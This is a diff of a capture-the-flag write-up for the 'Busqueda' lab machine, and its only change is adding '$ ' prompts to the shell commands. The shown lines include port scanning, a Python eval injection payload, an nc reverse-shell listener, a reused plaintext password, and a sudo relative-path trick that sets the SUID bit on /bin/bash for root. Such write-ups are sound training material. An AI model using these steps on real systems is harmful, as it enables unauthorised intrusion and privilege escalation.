@@ -18,8 +18,8 @@ Busqueda is an easy Linux box running Apache on 80 and SSH on 22. Port 80 serves
 ## recon
 
 ```bash
-nmap -p- --min-rate 10000 10.129.48.49
-nmap -p 22,80 -sCV 10.129.48.49
+$ nmap -p- --min-rate 10000 10.129.48.49
+$ nmap -p 22,80 -sCV 10.129.48.49
 ```
 
 Two ports.
@@ -97,7 +97,7 @@ engine=BBC&query=http%3a//127.0.0.1/'%2beval(compile('for+x+in+range(1)%3a\n+imp
 ```
 
 ```bash
-nc -lvnp 3333
+$ nc -lvnp 3333
 # connection back as svc
 ```
 
@@ -138,7 +138,7 @@ Looking at the app directory I found a Gitea checkout under `/var/www/app/.git`.
 That password, `jh1usoih2bkjaspwe92`, was reused for the svc SSH account:
 
 ```bash
-ssh svc@searcher.htb   # password: jh1usoih2bkjaspwe92
+$ ssh svc@searcher.htb   # password: jh1usoih2bkjaspwe92
 ```
 
 svc held the user flag.
@@ -148,7 +148,7 @@ svc held the user flag.
 ### the sudo script
 
 ```bash
-sudo -l
+$ sudo -l
 ```
 
 svc could run one Python script as root with any arguments:
@@ -178,7 +178,7 @@ mysql:8              ...   127.0.0.1:3306->3306/tcp                          mys
 
 {% raw %}
 ```bash
-sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
 ```
 {% endraw %}
 
@@ -226,10 +226,10 @@ The content does not matter though. The script runs as root because the whole th
 I made a writable working dir, dropped my own `full-checkup.sh` that SUIDs bash, and invoked the sudo command from there:
 
 ```bash
-mkdir ~/temp && cd ~/temp
-echo -e '#!/bin/bash\nchmod u+s /bin/bash' > full-checkup.sh
-chmod +x full-checkup.sh
-sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+$ mkdir ~/temp && cd ~/temp
+$ echo -e '#!/bin/bash\nchmod u+s /bin/bash' > full-checkup.sh
+$ chmod +x full-checkup.sh
+$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
 ```
 
 Root ran the script (the tell is the PM2 table printing under sudo, which only root could produce from that working dir), `/bin/bash` picked up the SUID bit, and `bash -p` kept the root euid:
